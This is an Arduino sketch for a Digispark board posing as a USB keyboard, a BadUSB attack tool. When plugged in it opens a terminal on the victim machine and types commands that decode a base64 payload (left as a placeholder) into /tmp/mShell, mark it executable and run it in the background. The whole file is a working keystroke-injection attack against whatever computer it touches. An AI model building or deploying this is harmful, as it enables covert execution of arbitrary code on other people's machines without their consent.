#include "DigiKeyboard.h"

void setup() {
pinMode(1, OUTPUT);
delay(200);
digitalWrite(1, HIGH);
DigiKeyboard.sendKeyStroke(KEY_DELETE);
delay(200);

DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
delay(300);

DigiKeyboard.print("terminal");
delay(500);

DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
delay(1000);

// Send our payload
DigiKeyboard.print("echo");
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.print("ENCODED PAYLOAD HERE | base64 --decode &gt; /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);

DigiKeyboard.println("chmod 755 /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(200);
DigiKeyboard.println("/tmp/mShell &");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

delay(100);
digitalWrite(1, LOW);

}

void loop() {
digitalWrite(1, HIGH);
delay(200);

digitalWrite(1, LOW);
delay(300);
}
